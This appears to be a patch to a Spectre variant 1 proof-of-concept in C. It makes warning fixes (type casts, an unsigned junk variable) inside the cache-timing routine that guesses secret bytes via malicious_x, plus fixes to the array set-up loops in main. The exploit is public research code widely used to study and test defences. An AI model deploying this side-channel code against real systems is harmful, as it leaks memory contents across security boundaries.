@@ -100,7 +100,8 @@ void flush_memory_sse(uint8_t * addr)
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
   static int results[256];
-  int tries, i, j, k, mix_i, junk = 0;
+  int tries, i, j, k, mix_i;
+  unsigned int junk = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
@@ -108,6 +109,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #ifdef NOCLFLUSH
   int junk2 = 0;
   int l;
+  (void)junk2;
 #endif
 
   for (i = 0; i < 256; i++)
@@ -209,7 +211,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
 #endif
-      if (time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -256,12 +258,12 @@ int main(int argc,
   int i;
 
   #ifdef NOCLFLUSH
-  for (i = 0; i < sizeof(cache_flush_array); i++) {
+  for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
     cache_flush_array[i] = 1;
   }
   #endif
   
-  for (i = 0; i < sizeof(array2); i++) {
+  for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
   }
 
